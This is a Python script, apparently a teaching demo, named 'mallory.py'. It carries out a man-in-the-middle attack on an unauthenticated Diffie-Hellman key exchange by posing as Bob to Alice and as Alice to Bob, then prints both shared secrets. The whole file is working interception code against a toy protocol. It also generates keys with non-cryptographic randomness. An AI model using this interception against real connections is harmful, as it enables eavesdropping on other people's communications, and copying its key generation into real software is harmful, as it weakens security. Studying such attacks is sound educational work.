# mallory.py
import socket
import random
import threading

p = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD1
g = 2

def dh_priv(): return random.randint(2, p-2)
def dh_pub(a): return pow(g, a, p)
def dh_secret(pub, priv): return pow(pub, priv, p)

BOB_IP = "192.168.15.137"   # change this to Bob's IP
BOB_PORT = 5000
LISTEN_PORT = 5000         # Mallory pretends to be Bob

def handle_alice(alice_conn):
    print("[Mallory] Alice connected")

    # ---------------------------
    # 1. Intercept Alice’s public key
    # ---------------------------
    alice_pub = int(alice_conn.recv(4096).decode())
    print(f"[Mallory] Got Alice public key: {alice_pub}")

    # Mallory makes her own DH keys for connection with Alice
    m1_priv = dh_priv()
    m1_pub = dh_pub(m1_priv)

    # Send Mallory’s public key as if it were Bob’s
    alice_conn.send(str(m1_pub).encode())
    print(f"[Mallory] Sent fake Bob key (Mallory key): {m1_pub}")

    # Mallory Computes shared secret with Alice
    secret_A = dh_secret(alice_pub, m1_priv)
    print(f"[Mallory] Shared secret with Alice: {secret_A}")

    # ---------------------------
    # 2. Connect to real Bob
    # ---------------------------
    bob_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    bob_sock.connect((BOB_IP, BOB_PORT))
    print("[Mallory] Connected to Bob")

    # Mallory does a separate DH exchange with Bob
    m2_priv = dh_priv()
    m2_pub = dh_pub(m2_priv)

    # Send Mallory’s public key to Bob, pretending to be Alice
    bob_sock.send(str(m2_pub).encode())
    print(f"[Mallory] Sent fake Alice key to Bob: {m2_pub}")

    bob_pub = int(bob_sock.recv(4096).decode())
    print(f"[Mallory] Received Bob public key: {bob_pub}")

    secret_B = dh_secret(bob_pub, m2_priv)
    print(f"[Mallory] Shared secret with Bob: {secret_B}")

    print("\n### MITM SUCCESSFUL ###")
    print("Alice <-> Mallory <-> Bob")
    print(f"Secret with Alice: {secret_A}")
    print(f"Secret with Bob:    {secret_B}")
    print("These two secrets are DIFFERENT, and Mallory can decrypt/reencrypt.\n")

    alice_conn.close()
    bob_sock.close()

def main():
    print("[Mallory] Waiting for Alice (pretending to be Bob)...")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", LISTEN_PORT))
    s.listen(1)

    while True:
        conn, addr = s.accept()
        threading.Thread(target=handle_alice, args=(conn,)).start()

if __name__ == "__main__":
    main()